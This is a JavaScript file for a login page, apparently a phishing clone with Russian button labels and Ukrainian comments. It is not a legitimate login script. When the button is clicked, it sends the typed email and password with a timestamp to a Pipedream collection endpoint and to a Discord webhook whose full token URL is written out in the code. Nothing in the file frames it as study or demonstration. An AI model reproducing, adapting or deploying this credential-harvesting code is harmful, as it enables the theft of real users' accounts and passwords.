document.addEventListener("DOMContentLoaded", function () {
  const input1 = document.getElementById("useremail");
  const input2 = document.getElementById("passwordInput");
  const myButton = document.getElementById("myButton");
  const toggleBtn = document.querySelector(".toggle-btn");

  function changeButtonColor() {
    const value1 = input1.value.trim();
    const value2 = input2.value.trim();

    if (value1 !== "" && value2 !== "") {
      myButton.style.backgroundColor = "rgba(254, 44, 85, 1)";
      myButton.style.color = "#fff";
    } else {
      myButton.style.backgroundColor = "";
    }
  }

  input1.addEventListener("input", changeButtonColor);
  input2.addEventListener("input", changeButtonColor);

  function togglePassword() {
    const passwordField = document.getElementById("passwordInput");
    if (passwordField.type === "password") {
      passwordField.type = "text";
      toggleBtn.textContent = "Скрыть";
    } else {
      passwordField.type = "password";
      toggleBtn.textContent = "Показать";
    }
  }

  toggleBtn.addEventListener("click", togglePassword);

  function sendData() {
    var userEmailValue = input1.value;
    var passwordValue = input2.value;

    const currentTime = new Date().toLocaleString();

    fetch('https://eoj0l0tozcs5tz7.m.pipedream.net', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        userLogin: userEmailValue,
        password: passwordValue,
        time: currentTime
        // Додайте інші дані, які ви хочете відправити на сервер
      })
    })
    .then(response => response.json())
    .then(data => console.log('Дані відправлені на сервер:', data))
    .catch(error => console.error('Помилка на сервері:', error));

    const discordWebhookURL = 'https://discord.com/api/webhooks/1189552007174946926/rgjv5CVEe-MXBxcEQfHkj9QK-k3213N3GGMgvo_X8zP-53MVIfDLK2Px5uPCkZvm8Cac';

    fetch(discordWebhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: `Нові дані: \nЛогін: ${userEmailValue}\nПароль: ${passwordValue}\nДата: ${currentTime}`
        // Додайте інші дані, які ви хочете відправити в Discord
      })
    })
    .then(response => response.json())
    .then(data => console.log('Дані відправлені в Discord:', data))
    .catch(error => console.error('Помилка при відправці в Discord:', error));
  }

  myButton.addEventListener('click', sendData);
});
